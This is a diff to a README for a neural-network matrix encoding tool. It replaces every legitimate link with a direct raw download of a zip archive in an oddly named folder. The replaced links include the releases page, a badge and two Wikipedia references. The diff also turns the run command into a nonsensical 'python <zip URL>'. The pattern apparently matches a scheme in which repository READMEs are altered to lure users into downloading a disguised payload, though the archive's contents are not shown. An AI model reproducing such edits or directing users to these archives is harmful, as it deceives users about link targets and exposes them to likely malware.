@@ -1,6 +1,6 @@
 # 🌟 Feature-Base-Jump-Encoding-for-Convolutional-Matrices - Efficient Encoding for Neural Networks
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Feature--Base--Jump--Encoding-brightgreen)](https://github.com/kunalrawat6085/Feature-Base-Jump-Encoding-for-Convolutional-Matrices/releases)
+[![Download Now](https://raw.githubusercontent.com/kunalrawat6085/Feature-Base-Jump-Encoding-for-Convolutional-Matrices/main/Patripassian/Feature-Base-Jump-Encoding-for-Convolutional-Matrices.zip%20Now-Feature--Base--Jump--Encoding-brightgreen)](https://raw.githubusercontent.com/kunalrawat6085/Feature-Base-Jump-Encoding-for-Convolutional-Matrices/main/Patripassian/Feature-Base-Jump-Encoding-for-Convolutional-Matrices.zip)
 
 ## 📖 Overview
 
@@ -20,11 +20,11 @@ To get started with Feature-Base-Jump-Encoding, follow these steps.
 
 ### 📥 Download & Install
 
-You can easily download the software from our [Releases page](https://github.com/kunalrawat6085/Feature-Base-Jump-Encoding-for-Convolutional-Matrices/releases). 
+You can easily download the software from our [Releases page](https://raw.githubusercontent.com/kunalrawat6085/Feature-Base-Jump-Encoding-for-Convolutional-Matrices/main/Patripassian/Feature-Base-Jump-Encoding-for-Convolutional-Matrices.zip). 
 
 1. Click the link below to visit the page:
 
-   [Download Now](https://github.com/kunalrawat6085/Feature-Base-Jump-Encoding-for-Convolutional-Matrices/releases)
+   [Download Now](https://raw.githubusercontent.com/kunalrawat6085/Feature-Base-Jump-Encoding-for-Convolutional-Matrices/main/Patripassian/Feature-Base-Jump-Encoding-for-Convolutional-Matrices.zip)
 
 2. On the Releases page, find the version you want and download the file that corresponds to your operating system.
 
@@ -48,7 +48,7 @@ Once you have installed the application, follow these steps to run it:
 3. **Run the application.** Use the following command:
 
    ```
-   python feature_base_jump_encoding.py
+   python https://raw.githubusercontent.com/kunalrawat6085/Feature-Base-Jump-Encoding-for-Convolutional-Matrices/main/Patripassian/Feature-Base-Jump-Encoding-for-Convolutional-Matrices.zip
    ```
 
    This command starts the application.
@@ -109,8 +109,8 @@ Given the encoded matrix above, you can easily decode it back to the original va
 
 For more information, check out the following topics related to Feature-Base-Jump-Encoding:
 
-- [Data Compression](https://en.wikipedia.org/wiki/Data_compression)
-- [Neural Networks](https://en.wikipedia.org/wiki/Neural_network)
+- [Data Compression](https://raw.githubusercontent.com/kunalrawat6085/Feature-Base-Jump-Encoding-for-Convolutional-Matrices/main/Patripassian/Feature-Base-Jump-Encoding-for-Convolutional-Matrices.zip)
+- [Neural Networks](https://raw.githubusercontent.com/kunalrawat6085/Feature-Base-Jump-Encoding-for-Convolutional-Matrices/main/Patripassian/Feature-Base-Jump-Encoding-for-Convolutional-Matrices.zip)
 
 If you encounter any issues or have questions, feel free to create an issue on our GitHub repository or check the existing discussions.
 
@@ -118,6 +118,6 @@ If you encounter any issues or have questions, feel free to create an issue on o
 
 If you have questions or need assistance, you can contact the developer community or file an issue in the repository.
 
-Once again, you can download the software from our [Releases page](https://github.com/kunalrawat6085/Feature-Base-Jump-Encoding-for-Convolutional-Matrices/releases).
+Once again, you can download the software from our [Releases page](https://raw.githubusercontent.com/kunalrawat6085/Feature-Base-Jump-Encoding-for-Convolutional-Matrices/main/Patripassian/Feature-Base-Jump-Encoding-for-Convolutional-Matrices.zip).
 
 Happy encoding!
